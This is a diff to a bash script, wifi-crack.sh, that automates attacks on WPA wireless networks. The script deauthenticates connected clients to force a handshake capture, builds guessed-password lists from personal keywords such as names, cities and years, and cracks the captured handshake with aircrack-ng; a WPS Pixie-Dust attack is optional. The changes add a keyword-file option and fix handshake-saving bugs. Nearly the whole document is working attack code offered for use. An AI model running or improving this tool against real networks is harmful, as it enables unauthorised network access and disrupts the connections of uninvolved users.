@@ -10,6 +10,7 @@
 # Usage:
 #   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi"
 #   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -k "john home city 1990 1234"
+#   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -K ./clues.txt   # keywords from a file (combinable with -k)
 #   sudo ./wifi-crack.sh -i wlan0 -b AA:BB:CC:DD:EE:FF -c 7 -w /usr/share/wordlists/rockyou.txt
 #
 # Options:
@@ -17,15 +18,16 @@
 #   -s SSID      target network name            -b BSSID   target BSSID (skip SSID lookup)
 #   -c CHAN      force channel (else detected)
 #   -w FILE      existing wordlist file          -k "words" build a custom list from keywords (+numbers)
+#   -K FILE      build a custom list from keywords read from FILE (whitespace/newline-separated; adds to -k)
 #   -t SEC       handshake capture timeout (default 180)    -d N  deauth burst size (default 4)
 #   --wps        also run a WPS Pixie-Dust attempt (optional)
 #   --no-crack   stop after capturing the handshake
 set -uo pipefail
 
-IFACE=""; SSID=""; BSSID=""; CHAN=""; WORDLIST=""; KEYWORDS=""; CAP_TO=180; DEAUTH_N=4; DO_WPS=0; NO_CRACK=0
+IFACE=""; SSID=""; BSSID=""; CHAN=""; WORDLIST=""; KEYWORDS=""; KEYFILE=""; CAP_TO=180; DEAUTH_N=4; DO_WPS=0; NO_CRACK=0
 while [ $# -gt 0 ]; do case "$1" in
   -i) IFACE="$2"; shift 2;; -s) SSID="$2"; shift 2;; -b) BSSID="$2"; shift 2;;
-  -c) CHAN="$2"; shift 2;; -w) WORDLIST="$2"; shift 2;; -k) KEYWORDS="$2"; shift 2;;
+  -c) CHAN="$2"; shift 2;; -w) WORDLIST="$2"; shift 2;; -k) KEYWORDS="$2"; shift 2;; -K) KEYFILE="$2"; shift 2;;
   -t) CAP_TO="$2"; shift 2;; -d) DEAUTH_N="$2"; shift 2;;
   --wps) DO_WPS=1; shift;; --no-crack) NO_CRACK=1; shift;;
   -h|--help) grep '^#' "$0" | sed 's/^# \?//'; exit 0;;
@@ -34,6 +36,9 @@ while [ $# -gt 0 ]; do case "$1" in
 [ "$(id -u)" -eq 0 ] || { echo "run with sudo"; exit 1; }
 [ -n "$IFACE" ] || { echo "need -i <iface>"; exit 2; }
 [ -n "$SSID$BSSID" ] || { echo "need -s <ssid> or -b <bssid>"; exit 2; }
+# trim stray leading/trailing whitespace from the SSID — otherwise it breaks the scan
+# match (looks for ,SSID,) and gets written into RESULT.txt/OUTDIR with the space attached
+SSID="${SSID#"${SSID%%[![:space:]]*}"}"; SSID="${SSID%"${SSID##*[![:space:]]}"}"
 
 # ---------- logging ----------
 if [ -t 1 ]; then B=$'\e[1m';G=$'\e[32m';Y=$'\e[33m';R=$'\e[31m';C=$'\e[36m';D=$'\e[2m';N=$'\e[0m'; else B=;G=;Y=;R=;C=;D=;N=; fi
@@ -133,6 +138,13 @@ fi
 [ -z "$BSSID" ] && BSSID=$(echo "$row" | cut -d, -f1 | tr -d ' ')
 [ -z "$CHAN"  ] && CHAN=$(echo "$row" | cut -d, -f4 | tr -d ' ')
 ENC=$(echo "$row" | cut -d, -f6 | tr -d ' '); CIPH=$(echo "$row" | cut -d, -f7 | tr -d ' ')
+# resolved by -b: pull the network name from the scan (CSV field 14, ESSID) and trim its
+# leading space so RESULT.txt / the target line show the name instead of "?" (stays empty
+# for a hidden SSID, in which case the ${SSID:-...} fallbacks still apply)
+if [ -z "$SSID" ]; then
+  SSID=$(echo "$row" | cut -d, -f14)
+  SSID="${SSID#"${SSID%%[![:space:]]*}"}"; SSID="${SSID%"${SSID##*[![:space:]]}"}"
+fi
 ok "target: ${SSID:-$BSSID}  BSSID=$BSSID  channel=$CHAN  enc=${ENC:-?}/${CIPH:-?}"
 iw dev "$MON" set channel "$CHAN" 2>/dev/null
 
@@ -169,10 +181,16 @@ cap="$OUTDIR/hs"; rm -f "$cap"-*.cap "$cap"-*.csv
 airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
 AIRO_PID=$!; sleep 4
 have_hs(){ aircrack-ng "$cap"-01.cap 2>/dev/null | grep -qiE "$BSSID.*1 handshake|\(1 handshake\)"; }
-start=$(date +%s); rounds=0; quiet=0
+start=$(date +%s); rounds=0; quiet=0; CAPTURED=0
 while :; do
   elapsed=$(( $(date +%s) - start ))
-  if have_hs; then ok "handshake CAPTURED after ${elapsed}s"; break; fi
+  if have_hs; then
+    CAPTURED=1; ok "handshake CAPTURED after ${elapsed}s"
+    # snapshot NOW, while airodump still holds a known-good file; the kill below can
+    # flush a truncated .cap, which is why the post-loop re-read used to see nothing
+    cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
+    break
+  fi
   [ "$elapsed" -ge "$CAP_TO" ] && { warn "timeout (${CAP_TO}s) with no handshake"; break; }
   clients=$(awk -F, -v b="$BSSID" 'f && $1 ~ /:/ && toupper($0) ~ toupper(b){gsub(/ /,"",$1);print $1}
             /Station MAC/{f=1}' "$cap"-01.csv 2>/dev/null | sort -u | head -5)
@@ -198,17 +216,20 @@ while :; do
   sleep 6
 done
 kill "$AIRO_PID" 2>/dev/null; AIRO_PID=""
-have_hs || { err "no handshake captured — make sure a device is connected to the AP, then retry"; exit 3; }
-cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
+# decide on the in-loop result only — do NOT re-run have_hs against the live file we just killed
+[ "$CAPTURED" = 1 ] || { err "no handshake captured — make sure a device is connected to the AP, then retry"; exit 3; }
+[ -s "$OUTDIR/handshake.cap" ] || cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
 ok "handshake saved: $OUTDIR/handshake.cap"
 [ "$NO_CRACK" = 1 ] && { ok "stopping before crack (--no-crack)"; exit 0; }
 
 # ---------- wordlist ----------
 step "Preparing wordlist"
-if [ -n "$KEYWORDS" ]; then
+if [ -n "$KEYFILE" ]; then [ -f "$KEYFILE" ] || { err "keyword file not found: $KEYFILE"; exit 4; }; fi
+if [ -n "$KEYWORDS$KEYFILE" ]; then
   WORDLIST="$OUTDIR/wordlist.txt"
+  set -f  # keywords are literals — don't let a * or ? in -k / the file expand into a glob
   # shellcheck disable=SC2086
-  python3 - $KEYWORDS > "$WORDLIST" <<'PY'
+  python3 - $KEYWORDS $([ -n "$KEYFILE" ] && cat "$KEYFILE") > "$WORDLIST" <<'PY'
 import sys, itertools
 args=[a for a in sys.argv[1:] if a]
 words=[a for a in args if not a.isdigit()]; usernums=[a for a in args if a.isdigit()]
@@ -238,7 +259,9 @@ for a,b in itertools.permutations(sorted(bases),2):
 for c in sorted(out):
     if 8<=len(c)<=63: print(c)
 PY
-  ok "generated custom wordlist from keywords: $(wc -l <"$WORDLIST") candidates"
+  set +f
+  src="keywords"; [ -n "$KEYFILE" ] && src="$KEYFILE${KEYWORDS:+ + -k keywords}"
+  ok "generated custom wordlist from $src: $(wc -l <"$WORDLIST") candidates"
 else
   WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
   [ -f "$WORDLIST" ] || { err "wordlist not found: $WORDLIST  (sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz)"; exit 4; }
